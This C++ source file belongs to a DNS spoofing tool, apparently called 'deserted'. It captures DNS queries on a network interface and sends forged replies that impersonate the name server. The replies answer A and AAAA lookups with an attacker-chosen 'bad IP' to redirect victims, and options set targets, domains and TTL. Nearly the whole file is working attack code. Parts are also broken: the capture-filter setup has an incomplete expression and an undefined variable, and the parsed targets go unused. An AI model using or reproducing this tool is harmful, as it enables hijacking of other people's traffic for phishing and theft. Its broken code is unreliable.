#include "Program.h"

#include <EthLayer.h>
#include <IPv4Layer.h>
#include <UdpLayer.h>
#include <PcapFilter.h>

#include <chrono>
#include <thread>
#include <mutex>

#include "Screen.h"
#include "Utils.h"

Arguments Program::args {};
bool Program::isCapturing = false;
std::condition_variable Program::capturingEnded;

Program::Program(const std::string& name, int argc, char* argv[])
    : 
    name(name),
    parser(name)
{
    ParseArguments(argc, argv);
    InitCaptureInterface();
}

void Program::Run()
{
    Screen::PrintBanner();
    std::cout << "Waiting for DNS packets to come...\n" << std::flush;

    if(dev->startCapture(Program::OnPacketCapture, nullptr))
    {
        isCapturing = true;
        std::unique_lock<std::mutex> lckg(mtx);
        capturingEnded.wait(lckg, [this]{return !isCapturing;}); // Sleep until we have stopped capturing
    }

    if (!isCapturing)
    {
        dev->stopCapture();
        dev->close();
    }
}

void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
{
    pcpp::Packet parsedPacket(packet);

    pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
    if(!dnsLayer || dnsLayer->getDnsHeader()->numberOfAnswers != 0 || dnsLayer->getDnsHeader()->numberOfAuthority != 0 || dnsLayer->getDnsHeader()->numberOfAdditional != 0) // the packet isn't a DNS one or is a retransmission / response packet)
        return;
    pcpp::EthLayer* ethLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    pcpp::UdpLayer* udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>(); 
    pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();

    // Constructing the poisoned response
    uint16_t originalID = dnsLayer->getDnsHeader()->transactionID;

    pcpp::MacAddress sourceMac = ethLayer->getDestMac(); // They are switched because we are impersonating the name server
    pcpp::MacAddress destMac = ethLayer->getSourceMac();

    pcpp::IPv4Address sourceIP = ipLayer->getDstIPv4Address(); // They are switched because we are impersonating the name server
    pcpp::IPv4Address destIP = ipLayer->getSrcIPv4Address();

    uint16_t sourcePort = udpLayer->getDstPort(); // They are switched because we are impersonating the name server
    uint16_t destPort = udpLayer->getSrcPort();

    pcpp::EthLayer poisonedEthLayer(sourceMac, destMac);
    pcpp::IPv4Layer poisonedIPLayer(sourceIP, destIP);
    pcpp::UdpLayer poisonedUdpLayer(sourcePort, destPort);
    pcpp::DnsLayer poisonedDnsLayer;
    poisonedDnsLayer.getDnsHeader()->transactionID = originalID;
    poisonedDnsLayer.getDnsHeader()->queryOrResponse = 1;

#ifdef SUPPORT_MULTIPLE_QUERIES_IN_A_SINGLE_REQUEST
    for(pcpp::DnsQuery* currentQuery = dnsLayer->getFirstQuery(); currentQuery; currentQuery = dnsLayer->getNextQuery(currentQuery))
    {
        if (args.specificDomains)
        {
            bool domainMatch = false;
            for(const std::string& domain : args.domains)
            {
                if (currentQuery->getName().compare(domain) == 0)
                {
                    switch(currentQuery->getDnsType())
                    {
                        case pcpp::DnsType::DNS_TYPE_A:
                        {
                            PoisonARecord(poisonedDnsLayer, currentQuery);
                            domainMatch = true;
                            continue;
                        }
                    }
                    break;
                }
            }
            if (!domainMatch)
            {
                poisonedDnsLayer.addQuery(currentQuery); // No response for this query
            }
        }
        else
        {
            PoisonARecord(poisonedDnsLayer, currentQuery);
        }
    }
#else
    pcpp::DnsQuery* query = dnsLayer->getFirstQuery();
    std::string dnsQueryName = query->getName();

    if (args.specificDomains)
    {
        if(std::binary_search(args.domains.begin(), args.domains.end(), dnsQueryName))
        {
            switch(query->getDnsType())
                {
                    case pcpp::DnsType::DNS_TYPE_A:
                    {
                        PoisonARecord(poisonedDnsLayer, query);
                        break;
                    }
                    case pcpp::DnsType::DNS_TYPE_AAAA:
                    {
                        PoisonAAAARecord(poisonedDnsLayer, query);
                        break;
                    }
                    default:
                        break;
                }
        }
        else
        {
            return;
        }
    }
    else
    {
        switch(query->getDnsType())
        {
            case pcpp::DnsType::DNS_TYPE_A:
            {
                PoisonARecord(poisonedDnsLayer, query);
                break;
            }
            case pcpp::DnsType::DNS_TYPE_AAAA:
            {
                PoisonAAAARecord(poisonedDnsLayer, query);
                break;
            }
            default:
                break;
        }
    }
#endif


    pcpp::Packet poisonedPacket(100);

    poisonedPacket.addLayer(&poisonedEthLayer);
    poisonedPacket.addLayer(&poisonedIPLayer);
    poisonedPacket.addLayer(&poisonedUdpLayer);
    poisonedPacket.addLayer(&poisonedDnsLayer);

    poisonedPacket.computeCalculateFields();

    if (!dev->sendPacket(&poisonedPacket))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to send poisoned packet." << std::endl;
        Screen::Reset();

        if(!args.keepAlive)
        {
            isCapturing = false;
            capturingEnded.notify_all();
        }
        return;

    }

    Screen::SetColour(Screen::ForegroundColour::Green);
    std::cout << "Poisoned response sent." << std::endl;
    Screen::Reset();

    if (!args.keepAlive)
    {
        isCapturing = false;
        capturingEnded.notify_all();
    }

    return;
}

void PoisonDNSLayer(pcpp::DnsLayer& dnsLayer, const pcpp::DnsLayer& originalLayer)
{
    dnsLayer.getDnsHeader()->transactionID = originalLayer.getDnsHeader()->transactionID;
}

void Program::PoisonARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
{
    pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
    dnsLayer.addQuery(query);
    dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
}

void Program::PoisonAAAARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
{
    pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
    dnsLayer.addQuery(query);
    dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
}

void Program::ParseArguments(int argc, char* argv[])
{
    parser.add_argument("-t", "--targets").required().help("A comma-separated of hosts (IPv4 or IPv6) without whitespace");
    parser.add_argument("-i", "--interface").required().help("Network interface to use");
    parser.add_argument("-b", "--bad-ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
    parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");

    std::vector<std::string> errors;
    try
    {
        parser.parse_args(argc, argv);

        // parse bad IP
        args.evilIPv4 = pcpp::IPv4Address(parser.get("--bad-ip"));
        if (!args.evilIPv4.isValid())
        {
            errors.emplace_back("Invalid malicious IPv4 specified!");
        }

        // parse bad IPv6
        if (parser.is_used("--bad-ipv6"))
        {
            args.evilIPv6 = pcpp::IPv6Address(parser.get("--bad-ipv6"));
            if (!args.evilIPv6.isValid())
            {
                errors.emplace_back("Invalid malicious IPv6 specified!");
            }
        }

        // Parse interface
        args.interface.name = parser.get("--interface");
        args.interface.dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(args.interface.name);
        if (!args.interface.dev) 
        {
            errors.emplace_back("Failed to use the specified interface");
        }

        // Parse targets
        std::vector<std::string> targets = std::move(SplitString(parser.get("--targets"), ','));
        for (const auto& t : targets)
        {
            pcpp::IPv4Address IPv4(t);
            if (IPv4.isValid()) 
            {
                args.targetsV4.emplace_back(std::move(IPv4));
                continue;
            }
            else
            {
                pcpp::IPv6Address IPv6(t);
                if (IPv6.isValid())
                {
                    args.targetsV6.emplace_back(std::move(IPv6));
                    continue;
                }
                else
                {
                    errors.emplace_back("Targets list contains an invalid IP address: " + t);
                }
            }
        }

        // Parse TTL
        args.poisonTtl = parser.get<uint32_t>("--ttl");
        
        // Parse domains
        if(parser.is_used("--domains"))
        {
            args.specificDomains = true;
            args.domains = std::move(SplitString(parser.get("--domains"), ','));
        }
        
        if(errors.size() != 0)
        {
            std::string error_message = "";
            for (const auto& err : errors)
                error_message += err + "\n";
            throw std::runtime_error(error_message);
        }
    }
    catch(const std::runtime_error& err)
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << err.what() << '\n';
        Screen::Reset();

        std::cout << parser;
        exit(0);
    }
}

void Program::InitCaptureInterface()
{
    if (!dev->open())
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to open interface." << std::endl;
        Screen::Reset();
        exit(0);
    }

    // Setup the filters

    pcpp::PortFilter portFilter(args.port, pcpp::Direction::DST);
    pcpp::ProtoFilter udpFilter(pcpp::ProtocolType::);


    if(!dev->setFilter(finalFilter))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to setup capture filters." << std::endl;
        Screen::Reset();

        exit(0);
    }
}